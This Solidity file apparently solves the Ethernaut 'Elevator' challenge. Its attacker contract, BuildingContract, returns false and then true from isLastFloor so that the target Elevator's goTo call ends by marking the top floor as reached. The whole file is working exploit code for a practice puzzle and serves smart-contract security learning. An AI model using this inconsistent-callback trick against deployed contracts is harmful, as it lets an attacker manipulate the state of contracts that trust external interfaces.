// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract BuildingContract is Building {

    bool tempBool = true;
    Elevator _contract;

    function Attack(address payable _add) public {
        _contract = Elevator(_add);
        _contract.goTo(99);
    }

    function isLastFloor(uint _floor) external override returns (bool){
        if (tempBool) {
            tempBool = false;
            return false;
        }else{
            return true;
        }
    }
}